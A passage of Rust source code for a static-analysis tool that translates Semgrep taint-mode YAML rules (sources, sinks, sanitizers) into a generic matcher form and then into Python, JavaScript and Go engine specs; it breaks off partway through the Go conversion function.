//! Semgrep-compatible YAML bridge for `mode: taint` rules.
//!
//! This module parses a *narrow* subset of Semgrep's taint-mode schema into
//! foxguard's [`TaintSpec`] so that users can load existing Semgrep taint
//! rules via `--rules` without rewriting them.
//!
//! # Supported today
//!
//! - `mode: taint` with `languages: [python]`, `languages: [javascript]` /
//!   `[typescript]` / `[js]` / `[ts]`, `languages: [go]` / `[golang]`,
//!   `languages: [java]`, `languages: [c]`, `languages: [kotlin]` /
//!   `[kt]`, `languages: [ruby]` / `[rb]`, or `languages: [php]`.
//!   Other languages are rejected with a warning and the rule is skipped;
//!   non-taint rules fall through to the regular Semgrep bridge.
//! - `pattern-sources`, `pattern-sinks`, `pattern-sanitizers` as lists of
//!   single-`pattern:` entries, `pattern-either:` lists (which may nest
//!   recursively and flatten into multiple matchers for the same role), **or**
//!   `patterns:` AND-blocks (see below).
//! - `patterns:` AND-blocks inside source/sink/sanitizer entries: the bridge
//!   extracts all `pattern:` and `pattern-either:` sub-items as expressible
//!   matchers. Constraint-only sub-items (`pattern-inside:`, `pattern-not:`,
//!   `focus-metavariable:`, `metavariable-*:`) are dropped with a per-key
//!   warning (documented broadening — see COMPATIBILITY.md). If the block
//!   produces at least one expressible matcher, the entry is loaded; otherwise
//!   the entry is warn-skipped without aborting the whole rule.
//! - Severity mapping via the same `map_severity` used by the pattern-rule
//!   bridge (`ERROR` → Critical, `WARNING` → High, `INFO` → Medium).
//! - `metadata.cwe` propagated to findings.
//!
//! # Unsupported (rule is skipped with a warning)
//!
//! - Any `mode: taint` rule that does not target Python, JavaScript/TypeScript,
//!   Go, Java, C, or Kotlin.
//! - Any `pattern:` string whose shape is not one of:
//!   - bare identifier (`request`) — compiled to `ParamName`
//!   - dotted attribute chain (`request.data`, `request.json`) — compiled
//!     to `Attribute { root, field }` using the *leftmost* identifier and
//!     the *outermost* attribute (nested chains like `request.session.id`
//!     are flattened to `root="request", field="id"`; documented as a known
//!     gap that matches the engine's own one-level attribute propagation).
//!   - call form (`pickle.loads($X)`, `pickle.loads(...)`, `func($X)`,
//!     `func()`) — compiled to `Call { canonical }`, stripping arguments.
//!   - metavariable-receiver call (`$CONN.executeQuery($X)`,
//!     `$OBJ.innerHTML($X)`) — compiled to `MethodName { method }`, which
//!     matches any invocation of that method name regardless of receiver.
//!     Only valid as a sink or sanitizer shape; rejected as a source.
//!   - metavariable-receiver assignment (`$EL.innerHTML = $X`,
//!     `$EL.outerHTML = $X`) — compiled to `MemberAssign { field }`, which
//!     matches any property-assignment sink whose property name equals
//!     `field`. Only meaningful for JavaScript/TypeScript rules (the JS
//!     engine recognises this as a DOM-XSS sink pattern); other language
//!     engines include the matcher in the compiled spec but silently ignore
//!     it. Only valid as a sink or sanitizer shape; rejected as a source.
//!
//! A `patterns:` entry with NO expressible matchers (only constraint-only
//! sub-items) is warn-skipped. If all source or sink entries are warn-skipped
//! and none survive, the whole rule is skipped.

use crate::rules::apex_taint;
use crate::rules::bash_taint;
use crate::rules::c_taint;
use crate::rules::common::get_source_line;
use crate::rules::csharp_taint;
use crate::rules::go_taint;
use crate::rules::java_taint;
use crate::rules::javascript_taint;
use crate::rules::kotlin_taint;
use crate::rules::php_taint;
use crate::rules::python_taint;
use crate::rules::ruby_taint;
use crate::rules::scala_taint;
use crate::rules::solidity_taint;
use crate::rules::swift_taint;
use crate::rules::{FileContext, Rule};
use crate::{Finding, Language, Severity};
use serde_yaml_ng::Value as YamlValue;

// ─── Language-agnostic intermediate representation ───────────────────────
//
// The YAML bridge only produces three matcher shapes (Attribute, Call,
// ParamName).  Each engine has its own `NodeMatcher` enum with extra
// variants, but the YAML-compiled subset is identical across all three.
// We compile YAML into `GenericMatcher` first, then convert to the
// engine-specific type at analysis time.

#[derive(Clone, Debug)]
enum GenericMatcher {
    Attribute {
        root: String,
        field: String,
        description: String,
    },
    Call {
        canonical: String,
        description: String,
    },
    ParamName {
        names: Vec<String>,
        description: String,
    },
    /// Matches any method call whose final method name equals `method`,
    /// regardless of receiver. Compiled from patterns of the form
    /// `$METAVAR.method($X)` — the metavariable receiver is discarded and
    /// the engine matches any invocation of that method name.
    ///
    /// Supported as a sink/sanitizer shape for Python, JavaScript, Go, Java,
    /// and Kotlin. For C the matcher is included in the spec but the C engine
    /// only matches bare `Call` patterns, so `MethodName` entries are silently
    /// skipped (no C OOP method calls exist).
    MethodName { method: String, description: String },

    /// Matches any call whose CALLEE TEXT matches a compiled regex. Compiled
    /// from a taint sink/sanitizer `patterns:` AND-block that pairs a bare
    /// metavariable callee pattern (`$F(...)`) with a `metavariable-regex`
    /// pinning that metavariable. The regex is what bounds the otherwise
    /// universal bare-metavar callee, so the shape becomes FP-safe (only calls
    /// whose callee matches fire). Sink/sanitizer only.
    CallRegex {
        regex: crate::rules::semgrep_compat::CompiledRegex,
        description: String,
    },

    /// Matches any method call whose FINAL METHOD NAME matches a compiled
    /// regex, regardless of receiver. Compiled from a `$OBJ.$M(...)` pattern
    /// paired with a `metavariable-regex` pinning the method metavariable `$M`.
    /// The any-receiver, regex-bounded analogue of [`GenericMatcher::MethodName`].
    /// Sink/sanitizer only.
    MethodNameRegex {
        regex: crate::rules::semgrep_compat::CompiledRegex,
        description: String,
    },

    /// Matches any call whose callee root identifier equals `receiver`,
    /// regardless of method — compiled from `receiver.$METAVAR(...)` where
    /// `receiver` is a concrete identifier and the method is a metavariable
    /// (e.g. `os.$METHOD(...)`, `subprocess.$FUNC(...)`, `Kernel.$X(...)`).
    /// The symmetric counterpart of [`GenericMatcher::MethodName`]. Sink or
    /// sanitizer only.
    ReceiverCall {
        receiver: String,
        description: String,
    },

    /// Matches a member/property/attribute READ `<anything>.field`
    /// regardless of the receiver. Compiled from patterns of the form
    /// `$METAVAR.field` (a metavariable receiver, a plain-identifier field),
    /// e.g. `$REQ.body`, `$REQ.query`, `$REQ.headers`, `$REQ.cookies`,
    /// `$REQ.params`.
    ///
    /// This is the any-receiver analogue of [`GenericMatcher::Attribute`],
    /// which requires a concrete `root` identifier and so rejects a
    /// metavariable receiver like `$REQ.body`. It is the dominant rejected
    /// source shape across the registry (web-request property reads).
    ///
    /// Meaningful for object/property languages (Python, JS/TS, Go, Java,
    /// Kotlin, Ruby, PHP, C#) as a source, sink, or sanitizer. For C the
    /// matcher is carried in the spec but the engine no-ops it (plain C has
    /// no property-read sources).
    FieldName { field: String, description: String },

    /// Matches a subscript / index access `base[...]`. Compiled from patterns
    /// like `params[...]`, `cookies[...]`, `request.POST[...]`,
    /// `flask.request.args[...]`, or `$VALS[$INDEX]`.
    ///
    /// `base = Some(name)` matches a subscript whose indexed operand's final
    /// segment equals `name` (the last identifier before the `[`). For a
    /// metavariable base (`$M[...]`, `$VALS[$INDEX]`) `base = None` matches
    /// any subscript. Web frameworks express request-map indexing this way
    /// (`request.POST[...]`, `flask.request.args[...]`).
    ///
    /// Meaningful for object/property languages; the C engine no-ops it.
    Subscript {
        base: Option<String>,
        description: String,
    },

    /// Matches a property-assignment sink of the form `$EL.field = $X`.
    /// Compiled from Semgrep patterns like `$EL.innerHTML = $X` where the
    /// receiver is any Semgrep metavariable and `field` is a plain identifier.
    ///
    /// Only meaningful as a sink shape for JavaScript/TypeScript rules — the
    /// JS engine recognises `NodeMatcher::MemberAssign` for DOM-XSS patterns
    /// (`element.innerHTML = tainted`, `element.outerHTML = tainted`, etc.).
    /// For all other language engines the matcher is included in the compiled
    /// spec but silently ignored (those engines have no concept of
    /// property-assignment sinks). Only valid as a sink or sanitizer shape;
    /// rejected as a source.
    MemberAssign { field: String, description: String },

    /// Matches a string-building SINK containing a tainted value. Compiled
    /// from Semgrep sink patterns such as `"$SQL" + $EXPR`, `$M % $M`,
    /// `$A + $B`, f-strings `f"...{$X}..."`, and format calls
    /// `fmt.Sprintf("$FMT", ...)`, `sprintf($FMT, ...)`.
    ///
    /// Semantics: a SINK that is a binary `+`/`%` expression, an interpolated/
    /// format string, or a format call where one operand is a string literal/
    /// format AND the tainted value flows into another operand. Conservative
    /// (a non-tainted or literal-only concatenation never fires). Maps to
    /// SQL-injection / command-string sinks. Sink/sanitizer only.
    BinopFormat { description: String },

    /// Matches an object/dict literal SINK one of whose value positions holds a
    /// tainted expression. Compiled from Semgrep sink patterns such as
    /// `{role: "system", content: $SINK}` (JS object literal) or
    /// `{"role": "system", "content": $SINK}` (Python dict) — the LLM
    /// system-prompt-injection rules (`openai`/`mistral`).
    ///
    /// Semantics: a SINK that is an object/dict literal construction where some
    /// field's value is the tainted value. Conservative (only fires when a
    /// literal is actually constructed AND a tainted value reaches a value
    /// slot). Sink/sanitizer only — a literal construction is a destination,
    /// not a taint origin. JS/TS and Python engines match it; others carry it.
    ObjectLiteralValue { description: String },

    /// Matches a `return $METAVAR` SINK: a `return` statement whose returned
    /// value is tainted. Compiled from Semgrep sink patterns of the form
    /// `return $SINK` / `return $X` (LLM "unsanitized return" and Flask
    /// directly-returned-format rules). Bounded to return position — only fires
    /// when a `return` returns a tainted value, not a universal bare-metavar
    /// sink. Sink/sanitizer only. Matched by the Python engine.
    ReturnValue { description: String },

    /// Matches any parameter or local variable whose DECLARED TYPE's final
    /// segment equals `type_name`. Compiled (Java only) from a Semgrep "typed
    /// metavariable" source `(HttpServletRequest $REQ)` — "any variable of type
    /// `HttpServletRequest` is a taint source". A trailing member/method read
    /// on the typed metavariable (`(HttpServletRequest $REQ).$FUNC(...)`) is a
    /// droppable narrowing: seeding the typed variable and letting the engine
    /// propagate through reads on it covers it.
    ///
    /// Source only — a declared type is a taint origin, not a destination.
    /// Only the Java engine consults it (matches `formal_parameter` /
    /// `local_variable_declaration` types); other engines carry it but no-op it.
    TypedName {
        type_name: String,
        description: String,
    },

    /// Matches an ASSIGNMENT/DECLARATION SINK whose LHS is a variable of
    /// declared type `type_name` (final `.`-segment) AND whose RHS is tainted.
    /// Compiled (Java only) from a Semgrep "typed assignment" sink
    /// `(java.io.File $FILE) = ...` — "a tainted value assigned into a variable
    /// of type `File` is the sink" (e.g. building a `File` from an untrusted
    /// path is a path-traversal sink).
    ///
    /// Sink/sanitizer only — a typed write is a destination, not a taint
    /// origin. The Java engine fires it on `variable_declarator` /
    /// `assignment_expression` LHS types only when the RHS carries taint (never
    /// on a bare `x = y`); other engines carry it but no-op it.
    TypedAssignTarget {
        type_name: String,
        description: String,
    },

    /// Matches any STRING-LITERAL node as a taint SOURCE — the Semgrep
    /// ellipsis-string source `"..."` ("any string literal is the taint
    /// origin"). Compiled from a bare `pattern-sources: - pattern: "..."`
    /// entry (the boto3 `hardcoded-token` rule and the JS hardcoded-secret
    /// family). Each engine seeds every string literal as tainted and lets
    /// its normal propagation carry the taint to the sink, so a hardcoded
    /// credential reaching a credential/JWT/crypto sink fires while a value
    /// read from the environment stays clean.
    ///
    /// Source only — a literal is a taint origin, not a destination. Matched
    /// by the Python and JavaScript engines (the only registry rules with
    /// this source shape target those languages); other engines carry it in
    /// the spec but no-op it.
    ///
    /// `regex = Some(pattern)` restricts the source to literals whose text
    /// matches the regex (the `pattern: "$URL"` + `metavariable-pattern`/
    /// `metavariable-regex` shape — a literal whose content matches a regex,
    /// e.g. the `requests` `http://` cleartext rules). `None` = any literal
    /// (the bare `"..."` hardcoded-secret shape).
    LiteralString {
        description: String,
        regex: Option<String>,
    },

    /// Matches a LOOSE-EQUALITY comparison SINK — a binary `==`/`!=` expression
    /// one of whose operands is tainted. Compiled from the PHP Semgrep sink
    /// patterns `$VAR1 == $VAR2` / `$VAR1 != $VAR2` (the `md5-loose-equality`
    /// type-juggling rule). Matches ONLY the loose operators, never the strict
    /// `===`/`!==` (which is the safe form the rule recommends). Sink/sanitizer
    /// only — a comparison is a destination, not a taint origin. Matched by the
    /// PHP engine; other engines carry it in the spec but no-op it.
    LooseEquality { description: String },

    /// Matches an object-creation SINK whose CLASS-NAME / CALLEE is tainted —
    /// the PHP unsafe-reflection sink `new $SINK(...)` bounded to its class-name
    /// metavariable (`tainted-object-instantiation`). Fires ONLY when the class
    /// name being instantiated carries taint, never on a tainted constructor
    /// argument. Sink/sanitizer only. Matched by the PHP engine; other engines
    /// carry it in the spec but no-op it.
    TaintedCallee { description: String },

    /// Matches an assignment-target SUBSCRIPT-KEY SINK — `$_SESSION[$KEY] = $VAL`
    /// whose KEY / index is tainted (the PHP `tainted-session` session-poisoning
    /// sink). `base = Some(name)` bounds the target base to a concrete
    /// superglobal (`_SESSION`); `base = None` matches any subscript target.
    /// Fires ONLY when the KEY carries taint, never on a tainted assigned VALUE.
    /// Sink/sanitizer only. Matched by the PHP engine; other engines carry it in
    /// the spec but no-op it.
    TaintedSubscriptKey {
        base: Option<String>,
        description: String,
    },

    /// Matches a value written into the focused ARGUMENT POSITION of a named CALL
    /// as a taint SOURCE — the Semgrep "focus a call argument" source
    /// `pattern-inside: (System.Random $RNG).NextBytes($KEY); ...` + focus/bare
    /// `pattern: $KEY` (the C# `use_weak_rng_for_keygeneration` rule: the buffer
    /// filled by a weak RNG's `NextBytes(key)` becomes untrusted key material).
    /// The SOURCE-position dual of the focus-on-call-argument SINK shape: the
    /// engine SEEDS the identifier in the `arg_index`-th argument of a call whose
    /// final method name equals `method`, and its normal propagation carries that
    /// taint to the sink. Fires ONLY on the focused argument position of a
    /// matching call. Source only. Seeded by the C# engine; other engines carry
    /// it in the spec but no-op it.
    CallArgSource {
        method: String,
        arg_index: usize,
        description: String,
    },

    /// Seed the enclosing method's FIRST parameter as a taint source — the C#
    /// signature source `$T $M($INPUT,...) {...}`. See
    /// [`crate::rules::taint_engine::NodeMatcher::FirstParamSource`]. Compiled
    /// solely for the C# engine; other engines carry it but no-op it.
    FirstParamSource { description: String },

    /// Seed every parameter of a function decorated by a `<x>.<decorator>(...)`
    /// call — the MCP-handler source `@$SERVER.tool() def $F(..., $PARAM, ...)`.
    /// See [`crate::rules::taint_engine::NodeMatcher::DecoratedParamSource`].
    /// Seeded by the Python engine; other engines carry it but no-op it.
    DecoratedParamSource {
        decorator: String,
        description: String,
    },

    /// Match a call to `method(...)` one of whose arguments is a string
    /// concatenation (`+`) carrying tainted data — the C# xpath-injection sink
    /// `$NAV.Compile("..." + $INPUT + "...")`. See
    /// [`crate::rules::taint_engine::NodeMatcher::CallArgConcat`]. Compiled solely
    /// for the C# engine; other engines carry it but no-op it.
    CallArgConcat { method: String, description: String },

    /// Match a CONSTRUCTOR-ARGUMENT sink — a `new <Class>(arg0, ...)` whose
    /// class name is in `class_names` and whose argument at `arg_index` carries
    /// taint. Compiled (C# only) from the `csharp-sqli` sink arm
    /// `new $PATTERN($CMD,...)` + `focus-metavariable: $CMD` gated by a
    /// `metavariable-regex` anchored alternation on `$PATTERN` (ENUMERATED into
    /// `class_names`). See
    /// [`crate::rules::taint_engine::NodeMatcher::ConstructorArgSink`]. Other
    /// engines carry it but no-op it.
    ConstructorArgSink {
        class_names: Vec<String>,
        arg_index: usize,
        description: String,
    },

    /// Matches a call to one of `methods` whose argument at position `arg_index`
    /// is tainted — the positionally-precise Semgrep `focus-metavariable` sink
    /// (`tainted-session-from-http-request`'s
    /// `request.getSession().$FUNC($NAME, $VALUE)` + `focus: $VALUE`). See
    /// [`crate::rules::taint_engine::NodeMatcher::MethodArgSink`]. Compiled solely
    /// for the Java engine; other engines carry it but no-op it.
    MethodArgSink {
        methods: Vec<String>,
        arg_index: usize,
        description: String,
    },

    /// Match a PROPERTY-ASSIGNMENT sink — an assignment `<expr>.<Prop> = <RHS>`
    /// whose property name is in `property_names` and whose RHS carries taint.
    /// Compiled (C# only) from the `csharp-sqli` sink arm
    /// `$CMD.$PATTERN = $VALUE;` + `focus-metavariable: $VALUE` gated by a
    /// `metavariable-regex` anchored alternation on `$PATTERN` (ENUMERATED into
    /// `property_names`). See
    /// [`crate::rules::taint_engine::NodeMatcher::PropertyAssignSink`]. Other
    /// engines carry it but no-op it.
    PropertyAssignSink {
        property_names: Vec<String>,
        description: String,
    },

    /// Matches a `.method(...)` call whose receiver was initialized by
    /// `init_receiver.init_method("init_arg")` — the binding-linked Semgrep
    /// source (`md5-used-as-password`'s
    /// `$MD = MessageDigest.getInstance("MD5"); ... $MD.digest(...)`). See
    /// [`crate::rules::taint_engine::NodeMatcher::ReceiverProvenanceCall`].
    /// Compiled solely for the Java engine; other engines carry it but no-op it.
    ReceiverProvenanceCall {
        init_receiver: String,
        init_method: String,
        init_arg: String,
        method: String,
        description: String,
    },

    /// Inline method call `<recv>.<method>("<arg>", ...)` as a taint SOURCE
    /// (the JS `md5-used-as-password` source `$CRYPTO.createHash("md5")`). See
    /// [`crate::rules::taint_engine::NodeMatcher::LiteralArgCall`]. Compiled
    /// solely for the JS engine; other engines carry it but no-op it.
    LiteralArgCall {
        method: String,
        arg: String,
        description: String,
    },
}

#[derive(Clone, Debug)]
struct GenericSpec {
    sources: Vec<GenericMatcher>,
    sinks: Vec<GenericMatcher>,
    sanitizers: Vec<GenericMatcher>,
}

/// Compiled `pattern-not` constraints extracted from a taint rule's
/// `patterns:` AND-blocks, retained so the post-filter can enforce them
/// instead of dropping them (the historical precision bug).
///
/// Each entry is a SEARCH-mode [`CompiledAstPattern`] — compiled via the
/// same path as positive `pattern-not` matchers in `semgrep_compat.rs` —
/// so negative matching reuses the existing tree-sitter pattern engine
/// rather than the limited node-shape `GenericMatcher` vocabulary.
///
/// Constraints are partitioned by the role of the `patterns:` block they
/// came from: a `pattern-not` inside `pattern-sinks` is enforced against
/// the finding's sink node; one inside `pattern-sources` against the
/// source node. Source-side enforcement currently requires a source byte
/// range the finding does not carry (see [`SemgrepTaintRule`]
/// post-filter), so source negatives are collected but not yet applied —
/// see COMPATIBILITY.md for the deferred items.
#[derive(Clone, Default)]
struct TaintNegatives {
    /// `pattern-not` matchers compiled from `pattern-sinks` blocks.
    /// Enforced against each finding's sink byte range in the post-filter.
    sink: Vec<crate::rules::semgrep_compat::CompiledAstPattern>,
    /// `pattern-not` matchers compiled from `pattern-sources` blocks.
    /// Collected (so we stop dropping them) but enforcement is deferred
    /// until findings carry source byte offsets.
    source: Vec<crate::rules::semgrep_compat::CompiledAstPattern>,
}

/// Compiled `pattern-inside` constraints extracted from a taint rule's
/// `patterns:` AND-blocks, retained so the post-filter can ENFORCE them
/// instead of dropping them (a precision bug: dropping a `pattern-inside`
/// makes the matcher fire everywhere instead of only inside the required
/// region).
///
/// Each entry is a SEARCH-mode [`CompiledAstPattern`] — compiled via the
/// same path as positive `pattern-inside` matchers in `semgrep_compat.rs`.
/// `pattern-inside` is the INVERSE of `pattern-not`: a `pattern-not`
/// suppresses a finding whose node is *inside* the matched region, while a
/// `pattern-inside` keeps a finding only when its node *is* inside the
/// matched region (and drops it otherwise).
///
/// Constraints are partitioned by the role of the `patterns:` block they came
/// from. A `pattern-inside` inside `pattern-sinks` is enforced against the
/// finding's sink node. Source-side enforcement would require a source byte
/// range the finding does not carry (same limitation as source-side
/// `pattern-not`), so source insides are collected but not yet applied.
#[derive(Clone, Default)]
struct TaintInsides {
    /// `pattern-inside` matchers compiled from `pattern-sinks` blocks.
    /// Enforced against each finding's sink byte range in the post-filter:
    /// a finding is kept only if its sink is contained by one of these.
    sink: Vec<crate::rules::semgrep_compat::CompiledAstPattern>,
    /// `pattern-inside` matchers compiled from `pattern-sources` blocks.
    /// Collected (so we stop dropping them) but enforcement is deferred
    /// until findings carry source byte offsets.
    source: Vec<crate::rules::semgrep_compat::CompiledAstPattern>,
}

/// Convert the generic spec into a Python taint spec.
fn to_python_spec(g: &GenericSpec) -> python_taint::TaintSpec {
    python_taint::TaintSpec {
        sources: g.sources.iter().map(to_python_matcher).collect(),
        sinks: g.sinks.iter().map(to_python_matcher).collect(),
        sanitizers: g.sanitizers.iter().map(to_python_matcher).collect(),
    }
}

fn to_python_matcher(m: &GenericMatcher) -> python_taint::NodeMatcher {
    match m {
        GenericMatcher::Attribute {
            root,
            field,
            description,
        } => python_taint::NodeMatcher::Attribute {
            root: root.clone(),
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Call {
            canonical,
            description,
        } => python_taint::NodeMatcher::Call {
            canonical: canonical.clone(),
            description: description.clone(),
        },
        GenericMatcher::ParamName { names, description } => python_taint::NodeMatcher::ParamName {
            names: names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodName {
            method,
            description,
        } => python_taint::NodeMatcher::MethodName {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallRegex { regex, description } => python_taint::NodeMatcher::CallRegex {
            regex: regex.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodNameRegex { regex, description } => {
            python_taint::NodeMatcher::MethodNameRegex {
                regex: regex.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::ReceiverCall {
            receiver,
            description,
        } => python_taint::NodeMatcher::ReceiverCall {
            receiver: receiver.clone(),
            description: description.clone(),
        },
        GenericMatcher::FieldName { field, description } => python_taint::NodeMatcher::FieldName {
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Subscript { base, description } => python_taint::NodeMatcher::Subscript {
            base: base.clone(),
            description: description.clone(),
        },
        // MemberAssign is JS-specific; included in the spec for completeness but
        // the Python engine ignores it (no property-assignment sinks in Python).
        GenericMatcher::MemberAssign { field, description } => {
            python_taint::NodeMatcher::MemberAssign {
                field: field.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::BinopFormat { description } => python_taint::NodeMatcher::BinopFormat {
            description: description.clone(),
        },
        GenericMatcher::ObjectLiteralValue { description } => {
            python_taint::NodeMatcher::ObjectLiteralValue {
                description: description.clone(),
            }
        }
        GenericMatcher::ReturnValue { description } => python_taint::NodeMatcher::ReturnValue {
            description: description.clone(),
        },
        GenericMatcher::TypedName {
            type_name,
            description,
        } => python_taint::NodeMatcher::TypedName {
            type_name: type_name.clone(),
            description: description.clone(),
        },
        GenericMatcher::TypedAssignTarget {
            type_name,
            description,
        } => python_taint::NodeMatcher::TypedAssignTarget {
            type_name: type_name.clone(),
            description: description.clone(),
        },
        GenericMatcher::LiteralString { description, regex } => {
            python_taint::NodeMatcher::LiteralString {
                description: description.clone(),
                regex: regex.clone(),
            }
        }

        GenericMatcher::LooseEquality { description } => python_taint::NodeMatcher::LooseEquality {
            description: description.clone(),
        },
        GenericMatcher::TaintedCallee { description } => python_taint::NodeMatcher::TaintedCallee {
            description: description.clone(),
        },
        GenericMatcher::TaintedSubscriptKey { base, description } => {
            python_taint::NodeMatcher::TaintedSubscriptKey {
                base: base.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::CallArgSource {
            method,
            arg_index,
            description,
        } => python_taint::NodeMatcher::CallArgSource {
            method: method.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::FirstParamSource { description } => {
            python_taint::NodeMatcher::FirstParamSource {
                description: description.clone(),
            }
        }
        GenericMatcher::DecoratedParamSource {
            decorator,
            description,
        } => python_taint::NodeMatcher::DecoratedParamSource {
            decorator: decorator.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallArgConcat {
            method,
            description,
        } => python_taint::NodeMatcher::CallArgConcat {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::ConstructorArgSink {
            class_names,
            arg_index,
            description,
        } => python_taint::NodeMatcher::ConstructorArgSink {
            class_names: class_names.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::PropertyAssignSink {
            property_names,
            description,
        } => python_taint::NodeMatcher::PropertyAssignSink {
            property_names: property_names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodArgSink {
            methods,
            arg_index,
            description,
        } => python_taint::NodeMatcher::MethodArgSink {
            methods: methods.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::ReceiverProvenanceCall {
            init_receiver,
            init_method,
            init_arg,
            method,
            description,
        } => python_taint::NodeMatcher::ReceiverProvenanceCall {
            init_receiver: init_receiver.clone(),
            init_method: init_method.clone(),
            init_arg: init_arg.clone(),
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::LiteralArgCall {
            method,
            arg,
            description,
        } => python_taint::NodeMatcher::LiteralArgCall {
            method: method.clone(),
            arg: arg.clone(),
            description: description.clone(),
        },
    }
}

/// Convert the generic spec into a JavaScript taint spec.
fn to_js_spec(g: &GenericSpec) -> javascript_taint::TaintSpec {
    javascript_taint::TaintSpec {
        sources: g.sources.iter().map(to_js_matcher).collect(),
        sinks: g.sinks.iter().map(to_js_matcher).collect(),
        sanitizers: g.sanitizers.iter().map(to_js_matcher).collect(),
    }
}

fn to_js_matcher(m: &GenericMatcher) -> javascript_taint::NodeMatcher {
    match m {
        GenericMatcher::Attribute {
            root,
            field,
            description,
        } => javascript_taint::NodeMatcher::Attribute {
            root: root.clone(),
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Call {
            canonical,
            description,
        } => javascript_taint::NodeMatcher::Call {
            canonical: canonical.clone(),
            description: description.clone(),
        },
        GenericMatcher::ParamName { names, description } => {
            javascript_taint::NodeMatcher::ParamName {
                names: names.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::MethodName {
            method,
            description,
        } => javascript_taint::NodeMatcher::MethodName {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallRegex { regex, description } => {
            javascript_taint::NodeMatcher::CallRegex {
                regex: regex.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::MethodNameRegex { regex, description } => {
            javascript_taint::NodeMatcher::MethodNameRegex {
                regex: regex.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::ReceiverCall {
            receiver,
            description,
        } => javascript_taint::NodeMatcher::ReceiverCall {
            receiver: receiver.clone(),
            description: description.clone(),
        },
        GenericMatcher::FieldName { field, description } => {
            javascript_taint::NodeMatcher::FieldName {
                field: field.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::Subscript { base, description } => {
            javascript_taint::NodeMatcher::Subscript {
                base: base.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::MemberAssign { field, description } => {
            javascript_taint::NodeMatcher::MemberAssign {
                field: field.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::BinopFormat { description } => javascript_taint::NodeMatcher::BinopFormat {
            description: description.clone(),
        },
        GenericMatcher::ObjectLiteralValue { description } => {
            javascript_taint::NodeMatcher::ObjectLiteralValue {
                description: description.clone(),
            }
        }
        GenericMatcher::ReturnValue { description } => javascript_taint::NodeMatcher::ReturnValue {
            description: description.clone(),
        },
        GenericMatcher::TypedName {
            type_name,
            description,
        } => javascript_taint::NodeMatcher::TypedName {
            type_name: type_name.clone(),
            description: description.clone(),
        },
        GenericMatcher::TypedAssignTarget {
            type_name,
            description,
        } => javascript_taint::NodeMatcher::TypedAssignTarget {
            type_name: type_name.clone(),
            description: description.clone(),
        },
        GenericMatcher::LiteralString { description, regex } => {
            javascript_taint::NodeMatcher::LiteralString {
                description: description.clone(),
                regex: regex.clone(),
            }
        }
        GenericMatcher::LooseEquality { description } => {
            javascript_taint::NodeMatcher::LooseEquality {
                description: description.clone(),
            }
        }
        GenericMatcher::TaintedCallee { description } => {
            javascript_taint::NodeMatcher::TaintedCallee {
                description: description.clone(),
            }
        }
        GenericMatcher::TaintedSubscriptKey { base, description } => {
            javascript_taint::NodeMatcher::TaintedSubscriptKey {
                base: base.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::CallArgSource {
            method,
            arg_index,
            description,
        } => javascript_taint::NodeMatcher::CallArgSource {
            method: method.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::FirstParamSource { description } => {
            javascript_taint::NodeMatcher::FirstParamSource {
                description: description.clone(),
            }
        }
        GenericMatcher::DecoratedParamSource {
            decorator,
            description,
        } => javascript_taint::NodeMatcher::DecoratedParamSource {
            decorator: decorator.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallArgConcat {
            method,
            description,
        } => javascript_taint::NodeMatcher::CallArgConcat {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::ConstructorArgSink {
            class_names,
            arg_index,
            description,
        } => javascript_taint::NodeMatcher::ConstructorArgSink {
            class_names: class_names.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::PropertyAssignSink {
            property_names,
            description,
        } => javascript_taint::NodeMatcher::PropertyAssignSink {
            property_names: property_names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodArgSink {
            methods,
            arg_index,
            description,
        } => javascript_taint::NodeMatcher::MethodArgSink {
            methods: methods.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::ReceiverProvenanceCall {
            init_receiver,
            init_method,
            init_arg,
            method,
            description,
        } => javascript_taint::NodeMatcher::ReceiverProvenanceCall {
            init_receiver: init_receiver.clone(),
            init_method: init_method.clone(),
            init_arg: init_arg.clone(),
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::LiteralArgCall {
            method,
            arg,
            description,
        } => javascript_taint::NodeMatcher::LiteralArgCall {
            method: method.clone(),
            arg: arg.clone(),
            description: description.clone(),
        },
    }
}

/// Convert the generic spec into a Go taint spec.
fn to_go_spec(g: &GenericSpec) -> go_taint::TaintSpec {
    go_taint::TaintSpec {
        sources: g.sources.iter().map(to_go_matcher).collect(),
        sinks: g.sinks.iter().map(to_go_matcher).collect(),
        sanitizers: g.sanitizers.iter().map(to_go_matcher).collect(),
    }
}

fn to_go_matcher(m: &GenericMatcher) -> go_taint::NodeMatcher {
    match m {
        GenericMatcher::Attribute {
            root,
            field,
            description,
        } => go_taint::NodeMatcher::Attribute {
            root: root.clone(),
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Call {
            canonical,
            description,
        } => go_taint::NodeMatcher::Call {
            canonical: canonical.clone(),
            description: description.clone(),
        },
